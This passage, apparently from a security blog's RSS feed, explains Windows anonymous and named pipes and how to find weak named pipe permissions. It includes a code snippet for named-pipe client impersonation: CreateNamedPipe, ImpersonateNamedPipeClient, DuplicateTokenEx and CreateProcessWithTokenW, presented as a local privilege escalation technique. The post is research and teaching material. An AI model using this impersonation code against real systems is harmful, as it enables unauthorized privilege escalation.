address of the pipe</strong>!</p><p>If the pipe has an address, other processes or remote processes can access it, and conversely, if it doesn&#x2019;t have an address, other processes can&#x2019;t access it!</p><p>Excuse me? Pipe is one of the IPCs, but how does it make sense that other processes can&#x2019;t access it&#x2026; &#x2190; We&#x2019;ll explain this in the Anonymous Pipe section later on lol.</p><p>So what does the address of a pipe refer to? It depends on the local pipe and the remote pipe, but for the remote pipe, we use the <strong>computer name</strong> to identify the PC on the network. You can find your computer name in your system properties, as shown above!</p><p>To summarize, we already knew that Named Pipes have no limitations on the range of communication (remote, local) due to the existence of a pipe address, and Anonymous Pipes have no limitations on the range of communication (remote, local), which we&#x2019;ll take a closer look at just below!</p><h3 id="Anonymous-Pipe"><a href="#Anonymous-Pipe" class="headerlink" title="Anonymous Pipe"></a>Anonymous Pipe</h3><p><img src="/2025/05/12/ogu123/NamedPipe/EN/5.png" alt></p><p>First, Anonymous Pipes are <strong>one-way</strong> in nature. When a Pipe is created via the <code>CreatePipe</code> function below, it returns a handle (hReadPipe, hWritePipe) for two processes to do their respective operations (Read/Write), since it is a one-way communication.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [out]          PHANDLE               hReadPipe,</span></span><span class="hljs-function"><span class="hljs-params">  [out]          PHANDLE               hWritePipe,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 nSize</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>When you said above that Anonymous Pipes are not accessible to other processes, what do you mean by &#x201C;<strong>two processes return handles (hReadPipe, hWritePipe) for each to do their own operations (Read/Write)</strong>&#x201D;&#x2026;? The bottom line is that Anonymous Pipes are used to communicate between processes in a parent-child relationship!</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CreateProcess</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPCSTR                lpApplicationName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, out, optional] LPSTR                 lpCommandLine,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in]                BOOL                  bInheritHandles,</span></span><span class="hljs-function"><span class="hljs-params">  [in]                DWORD                 dwCreationFlags,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPVOID                lpEnvironment,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span><span class="hljs-function"><span class="hljs-params">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span><span class="hljs-function"><span class="hljs-params">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>Create a Pipe with the <code>CreatePipe</code> function in the parent process and create a child process by setting the value of the <code>CreateProcess</code> function bInheritHandles argument to True.</p><p>This allows the parent process handle table to be inherited and used by the child process, so it can communicate with the Anonymous Pipe. The communication here uses the <code>ReadFile</code> and <code>WriteFile</code> functions.</p><p>If we wanted to have two-way communication, we could create two pipes, right?</p><p>Organizing an Anonymous Pipe means that other processes can&#x2019;t access it because it doesn&#x2019;t have a name, but child processes can access it through handle table inheritance, so Anonymous Pipe can be used for parent-child process communication.</p><h3 id="Named-Pipe"><a href="#Named-Pipe" class="headerlink" title="Named Pipe"></a>Named Pipe</h3><p><img src="/2025/05/12/ogu123/NamedPipe/EN/6.png" alt></p><p>Named Pipes are bi-directional in nature. The server is the one who creates the pipe, and the client is the one who uses the created pipe. Let&#x2019;s take a look at the functions that are important when using Named Pipes!</p><p>Check out the image above and the code below for a better understanding!</p><pre><code class="hljs cpp">hPipe = HANDLE CreateNamedPipe(  [in]           LPCSTR                lpName,  [in]           DWORD                 dwOpenMode,  [in]           DWORD                 dwPipeMode,  [in]           DWORD                 nMaxInstances,  [in]           DWORD                 nOutBufferSize,  [in]           DWORD                 nInBufferSize,  [in]           DWORD                 nDefaultTimeOut,  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes);</code></pre><p>First, we create a Pipe on the server with the <code>CreateNamedPipe</code> function. This is a two-way communication, so it returns a single handle to the server.</p><p>Here, the <strong>lpName</strong> argument is the name of the Pipe being created, which can also be set to Half-Duplex (server &#x2192; client, server &#x2190; client) via the <strong>dwOpenMode</strong> argument.</p><p>The <strong>nMaxInstances</strong> argument is the number of Pipe instances that will be created. If the value is 3, then up to 3 Pipes with the same name can be created and thus connected to a total of 3 clients.</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/7.png" alt></p><p>PipeList allows you to see the named pipes in your system.</p><p>If a Pipe with a Max Instances value of 1 receives requests from multiple clients, they will be associated with one Pipe and the remaining clients will be put into a waiting state. The amount of time the clients wait can be set by the <strong>nDefaultTimeOut</strong> argument.</p><pre><code class="hljs cpp">ConnectNamedPipe(hPipe, <span class="hljs-literal">NULL</span>);</code></pre><p>After creating a Pipe on the server, the <code>ConnectNamedPipe</code> function puts the Pipe in a <strong>connect-waiting state</strong> so that it can be accessed by other processes, both remote and local. Think of it as exposing the Pipe to the outside world!</p><pre><code class="hljs cpp"><span class="hljs-function">HANDLE <span class="hljs-title">CreateFile</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in]           LPCSTR                lpFileName,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 dwShareMode,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 dwCreationDisposition,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD                 dwFlagsAndAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] HANDLE                hTemplateFile</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>Now, on the client, insert the server Named Pipe you want to connect to in the <strong>lpFileName</strong> argument, run the <code>CreateFile</code> function, and you will be able to communicate with the Named Pipe. Communication uses the <code>ReadFile</code>, <code>WriteFile</code> functions just like Anonymous Pipe.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">WaitNamedPipe</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in] LPCSTR lpNamedPipeName,</span></span><span class="hljs-function"><span class="hljs-params">  [in] DWORD  nTimeOut</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>If a client sends a request for a Pipe connection via the <code>CreateFile</code> function, but the server Pipe instance is full, the <code>WaitNamedPipe</code> function can wait for the value of the <strong>nTimeOut</strong> argument.</p><p>If the <strong>nTimeOut</strong> argument is set to the default value, the <code>CreateNamedPipe</code> function will wait as long as the <strong>nDefaultTimeOut</strong> value.</p><p>So far, we&#x2019;ve seen what the names mean for Anonymous and Named Pipes, and how to create and use them in code. I think you should have no problem understanding the Windows Pipe code if you know the functions above!</p><h2 id="Windows-Named-pipe"><a href="#Windows-Named-pipe" class="headerlink" title="Windows Named pipe"></a>Windows Named pipe</h2><p>Now let&#x2019;s dive into Named Pipes in earnest!</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/8.png" alt></p><p>Pipes created using the <code>CreatePipe</code> or <code>CreateNamedPipe</code> functions are created in the kernel area and behave like a kind of shared memory. Windows treats this shared memory as a File Object, which is why you can see in the figure above that the Pipe is a File Object.</p><p>Therefore, when you send or receive data through a Pipe, you are using file-specific APIs like <code>ReadFile</code> or <code>WriteFile</code>.</p><p>In the case of Named Pipes, remote and local processes can connect through the name of the Pipe. Here&#x2019;s a look at the basic structure of a Pipe name.</p><pre><code class="hljs cpp">\\ServerName\pipe\PipeName</code></pre><ul><li>Server-side: <code>\\\\.\\pipe\\ogu123</code><ul><li>Since the server is creating the pipe on its own machine, you can use a .(dot) in the server name and the name of the pipe being created (<code>ogu123</code>) as the lpName argument to the <code>CreateNamedPipe</code> function.</li></ul></li><li>Client side: <code>\\\\.\\pipe\\ogu123</code> or <code>\\\\ComputerName\\pipe\\ogu123</code><ul><li>If the pipe you want to connect to exists on the local machine, use <code>\\\\.\\pipe\\ogu123</code></li><li>If the pipe you want to connect to exists on the remote computer, use <code>\\\\ComputerName\\pipe\\ogu123</code></li></ul></li></ul><p><img src="/2025/05/12/ogu123/NamedPipe/EN/9.png" alt></p><p>So far, we&#x2019;ve checked the location of the Pipe in memory and looked at the Pipe name structure.</p><p>If we create a Pipe on the server side via <code>\\\\.\\pipe\\ogu123</code>, let&#x2019;s see where the <code>ogu123</code> Pipe is actually created.</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/10.png" alt></p><p>NamedPipeServer.exe creates the <code>ogu123</code> Pipe. If we check the NamedPipeServer.exe process handle with Process Explorer, we can see that it has a Named Pipe handle named <code>ogu123</code>, as shown above.</p><p>The strange thing here is that we created the Pipe at the path <code>\\\\.\\pipe\\ogu123</code>, but it was actually created at <code>\\Device\\NamedPipe\\ogu123</code>.</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/11.png" alt></p><p>This can be seen by looking at the WinObj and seeing that <code>\\\\.\\pipe</code> is symlinked to the path <code>\\Device\\NamedPipe</code>, which creates the Pipe <code>\\Device\\NamedPipe\\ogu123</code>.</p><h2 id="Find-Named-pipe-vulnerabilities"><a href="#Find-Named-pipe-vulnerabilities" class="headerlink" title="Find Named pipe vulnerabilities"></a>Find Named pipe vulnerabilities</h2><p>Now let&#x2019;s dive into the process of finding vulnerabilities in Named Pipes!</p><p>We&#x2019;ll cover two exercises, the first to find them using Process Explorer, accesschk, IDA, etc. and the second to exploit them using the Client Impersonation technique!</p><p>For the first lab, I used the code from <a href="https://github.com/VerSprite/research/tree/master/projects/cpp/VulnerableApps/WindowsPipes">link</a> with some minor modifications.</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/12.png" alt></p><p>First, enable the handle option in Process Explorer, and then check the handle value of the target process running with elevated privileges.</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/13.png" alt></p><p>You can see that the target process (NamedPipeServer.exe) is running as administrator and that the ogu123 Pipe exists.</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/14.png" alt></p><p>You can now check the DACLs of all Named Pipes under \.\pipe\ with accesschk&#x2019;s <code>accesschk.exe \\pipe\\</code> command.</p><p>In the figure above, we can see that the ogu123 Pipe has RW permissions for the Everyone group, which means that the target process Named Pipe can be connected to and read/written by normal users.</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/15.png" alt></p><p>Now we just need to find the server-side Named Pipe creation part through IDA and find the point in the process of communicating with the client that will trigger the LPE.</p><p>First, you can find the server-side Named Pipe creation part by using IDA Imports or string search to find the functions shown above (including <code>CreateNamedPipeW()</code>).</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/16.png" alt></p><p>We see that the target process uses the <code>CreateNamedPipeW</code> function, and if we follow where it uses that function, we see that the</p><p><img src="/2025/05/12/ogu123/NamedPipe/EN/17.png" alt></p><p>You can see where to create the ogu123 Pipe. Now, after creating the Pipe, all you need to do is read the connected client messages on the server side and look for vectors that might trigger the LPE vulnerability! Simple, right?</p><h3 id="Client-Impersonation-Techniques"><a href="#Client-Impersonation-Techniques" class="headerlink" title="Client Impersonation Techniques"></a>Client Impersonation Techniques</h3><p>The Client Impersonation technique is a way for the server to obtain client authorization to perform LPE once it is connected to the client.</p><p>First, the server must obtain client authorization to perform impersonation, which is stored in the Access Token. The Access Token needs to be able to control &#x201C;<strong>what the server can do with my information</strong>&#x201D;, which is where the Impersonation Level comes in.</p><div class="table-container"><table><thead><tr><th>SECURITY_IMPERSONATION_LEVEL</th><th>Description</th></tr></thead><tbody><tr><td><code>SecurityAnonymous</code></td><td>The server cannot impersonate or identify the client.</td></tr><tr><td><code>SecurityIdentification</code></td><td>The server can get the identity and privileges of the client, but cannot impersonate the client.</td></tr><tr><td><code>SecurityImpersonation</code></td><td>The server can impersonate the client&#x2019;s security context on the local system.</td></tr><tr><td><code>SecurityDelegation</code></td><td>The server can impersonate the client&#x2019;s security context on remote systems.</td></tr></tbody></table></div><p>There are two types of access tokens: primary tokens and impersonation tokens, which we&#x2019;ll describe as processes and threads!</p><p>In Windows, every process has an Access Token, where the process token uses the Primary Token and does not change until the process is terminated.</p><p>A thread can have two values, a Primary Token and an Impersonation Token, and it shares the Primary Token value of the process.</p><p>A thread can use the Access Token of another account instead of the Primary Token when it is created, and the token it uses is the Impersonation Token! This means that the thread always references the Primary Token and only has an Impersonation Token when it is in impersonation.</p><pre><code class="hljs cpp">CreateFile(    <span class="hljs-string">L&quot;Local pipe path or remote pipe path&quot;</span>,    GENERIC_READ | GENERIC_WRITE,    <span class="hljs-number">0</span>,    <span class="hljs-literal">NULL</span>,    OPEN_EXISTING,    SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION, <span class="hljs-comment">// or SECURITY_DELEGATION</span>    <span class="hljs-literal">NULL</span>);</code></pre><p>Let&#x2019;s take a closer look at the LPE method with Client Impersonation!</p><p>When the target service or program calls <code>CreateFile()</code>, instead of the normal file path, it connects to the attacker&#x2019;s Named Pipe! The 6th argument of the <code>CreateFile()</code> function must have the value SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION or SECURITY_DELEGATION as shown above.</p><p>For remote pipes, SECURITY_IMPERSONATION is said to be enforced even if only SECURITY_SQOS_PRESENT is present.</p><pre><code class="hljs cpp"><span class="hljs-comment">// Create a server named pipe</span>serverPipe = CreateNamedPipe(    pipeName,           <span class="hljs-comment">// name of our pipe, must be in the form of \\.\pipe\&lt;NAME&gt;</span>    PIPE_ACCESS_DUPLEX, <span class="hljs-comment">// The rest of the parameters don&apos;t really matter</span>    PIPE_TYPE_MESSAGE,<span class="hljs-comment">// as all you want is impersonate the client...</span>    <span class="hljs-number">1</span>,<span class="hljs-comment">// </span>    <span class="hljs-number">2048</span>,<span class="hljs-comment">// </span>    <span class="hljs-number">2048</span>,<span class="hljs-comment">// </span>    <span class="hljs-number">0</span>,<span class="hljs-comment">// </span>    <span class="hljs-literal">NULL</span><span class="hljs-comment">// This should ne NULL so every client can connect</span>);<span class="hljs-comment">// wait for pipe connections</span>BOOL bPipeConnected = ConnectNamedPipe(serverPipe, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">// Impersonate client</span>BOOL bImpersonated = ImpersonateNamedPipeClient(serverPipe);<span class="hljs-comment">// if successful open Thread token - your current thread token is now the client&apos;s token</span>BOOL bSuccess = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;hToken);<span class="hljs-comment">// now you got the client token saved in hToken and you can safeyl revert back to self</span>bSuccess = RevertToSelf();<span class="hljs-comment">// Now duplicate the client&apos;s token to get a Primary token</span>bSuccess = DuplicateTokenEx(hToken,    TOKEN_ALL_ACCESS,    <span class="hljs-literal">NULL</span>,    SecurityImpersonation,    TokenPrimary,    &amp;hDuppedToken);<span class="hljs-comment">// If that succeeds you got a Primary token as hDuppedToken and you can create a proccess with that token</span>CreateProcessWithTokenW(hDuppedToken, LOGON_WITH_PROFILE, command, <span class="hljs-literal">NULL</span>, CREATE_NEW_CONSOLE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);</code></pre><p>Once the target client is connected to the attacker&#x2019;s Named Pipe server, the server can LPE with client privileges via the above code. Let&#x2019;s take a look at the main functions.</p><ul><li><code>ImpersonateNamedPipeClient()</code> : Applies the client Impersonation Token to the server thread. The Impersonation Token used is the token for applying the client&#x2019;s Primary Token to the thread.</li><li><code>RetrieveToSelf()</code>: Terminates the Impersonation. It must be executed before the <code>CreateProcessWithTokenW()</code> function is called to avoid errors.</li><li><code>DuplicateTokenEx()</code> : Duplicates the client Impersonation Token obtained earlier as the Primary Token for use in the process.</li><li><code>CreateProcessWithTokenW()</code> : Creates a process with client privileges through the Primary Token token. &#x2192; LPE occurs!</li></ul><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><strong>Conclusion</strong></h2><p>In this article, we took a deep dive into Windows IPC and Named Pipes! Writing this article reminded me that there are a lot of Windows Attack Vectors out there.</p><p>Thanks for reading this long post!</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h2><ul><li>&#xC708;&#xB3C4;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D;</li><li>&#xB1CC;&#xB97C; &#xC790;&#xADF9;&#xD558;&#xB294; &#xC708;&#xB3C4;&#xC6B0;&#xC988; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D;</li><li><a href="https://www.baeldung.com/cs/pipes-vs-sockets">https://www.baeldung.com/cs/pipes-vs-sockets</a></li><li><a href="https://www.codeproject.com/Articles/13724/Windows-IPC">https://www.codeproject.com/Articles/13724/Windows-IPC</a></li><li><a href="https://versprite.com/vs-labs/microsoft-windows-pipes-intro/">https://versprite.com/vs-labs/microsoft-windows-pipes-intro/</a></li><li><a href="https://versprite.com/vs-labs/vulnerable-named-pipe-application/">https://versprite.com/vs-labs/vulnerable-named-pipe-application/</a></li><li><a href="https://csandker.io/2021/01/10/Offensive-Windows-IPC-1-NamedPipes.html">https://csandker.io/2021/01/10/Offensive-Windows-IPC-1-NamedPipes.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/IPC/">IPC</category>
      
      <category domain="https://hackyboiz.github.io/tags/Named-Pipe/">Named Pipe</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anonymous-Pipe/">Anonymous Pipe</category>
      
      <category domain="https://hackyboiz.github.io/tags/Client-Impersonation/">Client Impersonation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/EN/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows Named Pipe (KR)</title>
      <link>https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/KR/</link>
      <guid>https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/KR/</guid>
      <pubDate>Mon, 12 May 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! ogu123&#xC785;&#xB2C8;&#xB2E4;!!</p><p>&#xC624;&#xB298;&#xC740; Windows Named Pipe&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xAC00;&#xC838;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xADF8;&#xB3D9;&#xC548; IPC&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xD1B5;&#xC2E0;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xBC29;&#xBC95;&#xC774;&#xB2E4;~ &#x2190; &#xC774;&#xB807;&#xAC8C; &#xB450;&#xB8E8;&#xBB49;&#xC220;&#xD558;&#xAC8C; &#xC54C;&#xACE0; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;.. </p><p>&#xC774;&#xBC88; &#xAE30;&#xD68C;&#xC5D0; &#xC81C;&#xB300;&#xB85C; &#xC54C;&#xC544;&#xBCF4;&#xACE0;&#xC790; &#xC5EC;&#xB7EC; IPC &#xC911; Named Pipe&#xC5D0; &#xB300;&#xD574; &#xC900;&#xBE44;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><del>(&#xD241;x9 &#xC0AC;&#xD6C4;&#xB8E8;&#xAC00; &#xB4E4;&#xACE0; &#xC788;&#xB294; &#xAC74; Pipe&#xC785;&#xB2C8;&#xB2E4;.)</del></p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/1.png" alt></p><h2 id="Windows-IPC"><a href="#Windows-IPC" class="headerlink" title="Windows IPC"></a>Windows IPC</h2><p>&#xBA3C;&#xC800; IPC(Inter Process Communication)&#xB780;, &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC774; &#xC11C;&#xB85C; &#xD1B5;&#xC2E0;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xC544;&#xB798;&#xB294; Windows&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB2E4;&#xC591;&#xD55C; IPC &#xBC29;&#xBC95;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li>&#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;(Shared Memory)</li><li>Mail Slot</li><li>COM(Component Object Model)</li><li>Pipe</li></ul><p>&#xC5EC;&#xAE30;&#xC11C; &#xC800;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4; &#xAC04;&#xC5D0; &#xD1B5;&#xC2E0;&#xC744; &#xC65C;? &#xD574;&#xC57C; &#xD558;&#xACE0;, &#xC5B4;&#xB5A4; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC744;&#xAE4C; &#xAD81;&#xAE08;&#xD588;&#xB294;&#xB370;&#xC694;?</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/2.png" alt></p><p>&#xBA3C;&#xC800; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC704; &#xADF8;&#xB9BC;&#xCC98;&#xB7FC; &#xAC1C;&#xBCC4;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB418;&#xC5B4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xB07C;&#xB9AC; &#xC11C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xB97C; <strong>&#xB3C5;&#xB9BD; &#xD504;&#xB85C;&#xC138;&#xC2A4;(Independent Process)</strong>&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC;, &#xBCF5;&#xC7A1;&#xD55C; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC0C1;&#xD0DC; &#xAC12;&#xC774;&#xB098; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC11C;&#xB85C; &#xC8FC;&#xACE0;&#xBC1B;&#xC544;&#xC57C; &#xD558;&#xB294;&#xB370;&#xC694;! &#xC774;&#xB97C; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC2DC;&#xB85C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/3.png" alt></p><p>&#xC5EC;&#xB7EC;&#xBD84;&#xC774; &#xC6F9; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC1B;&#xACE0; &#xC788;&#xB294; &#xC0C1;&#xD669;&#xC73C;&#xB85C; &#xAC00;&#xC815;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xB54C;, &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB294; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xC9C4;&#xD589; &#xC0C1;&#xD669;&#xC744; &#xD654;&#xBA74;&#xC5D0; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xC2E4;&#xC81C; &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB2E4;&#xC6B4; &#xBC1B;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB3D9;&#xC791; &#xC911; &#xC77C; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#x201C;<strong>&#xC9C0;&#xAE08; 70% &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD588;&#xC5B4;!</strong>&#x201D;&#xAC19;&#xC740; &#xC9C4;&#xD589; &#xC815;&#xBCF4;&#xB97C; &#xD654;&#xBA74; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xBCF4;&#xB0B4;&#xC57C; &#xC720;&#xC800;&#xAC00; &#xC9C4;&#xD589; &#xBC14;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xB610; &#xD654;&#xBA74; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#x201C;<strong>&#xC720;&#xC800;&#xAC00; &#xC815;&#xC9C0; &#xBC84;&#xD2BC; &#xB20C;&#xB800;&#xC5B4;!</strong>&#x201D;&#xB77C;&#xACE0; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC54C;&#xB824;&#xC8FC;&#xBA74; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xAC00; &#xBA48;&#xCD94;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xC608;&#xC2DC;&#xC640; &#xAC19;&#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xC0C1;&#xD0DC; &#xAC12;&#xC774;&#xB098; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; <strong>&#xD611;&#xB825; &#xD504;&#xB85C;&#xC138;&#xC2A4;(Co-operating Process)</strong>&#xB77C;&#xACE0; &#xD558;&#xACE0; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC04; &#xD1B5;&#xC2E0;&#xC744; &#xD560; &#xACBD;&#xC6B0;, &#xC790;&#xC6D0; &#xACF5;&#xC720;&#xB85C; &#xC791;&#xC5C5; &#xD6A8;&#xC728;&#xC131;&#xC774; &#xB192;&#xC544;&#xC9C0;&#xACE0;, &#xBCD1;&#xB82C; &#xCC98;&#xB9AC;&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB354; &#xBE60;&#xB974;&#xACE0; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC;, &#xC2DC;&#xC2A4;&#xD15C; &#xBCF5;&#xC7A1;&#xB3C4;&#xAC00; &#xC99D;&#xAC00;&#xD558;&#xBA70;, &#xB370;&#xC774;&#xD130; Read/Write &#xC2DC; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xB3D9;&#xAE30;&#xD654; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xCCA0;&#xC800;&#xD55C; &#xC124;&#xACC4;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Windows-IPC-Pipe"><a href="#Windows-IPC-Pipe" class="headerlink" title="Windows IPC Pipe"></a>Windows IPC Pipe</h2><p>&#xC704;&#xC5D0;&#xC11C; IPC&#xAC00; &#xBB34;&#xC5C7;&#xC774;&#xACE0; &#xC65C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0;&#xB294; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xB2E4;&#xC591;&#xD55C; Windows IPC &#xAE30;&#xBC95; &#xC911; Pipe&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; Pipe&#xB294; Anonymous Pipe&#xC640; Named Pipe &#xB450; &#xC885;&#xB958;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C1;&#xC5ED;&#xD558;&#xBA74; &#xC774;&#xB984; &#xC5C6;&#xB294; &#xD30C;&#xC774;&#xD504;&#xC640; &#xC774;&#xB984; &#xC788;&#xB294; 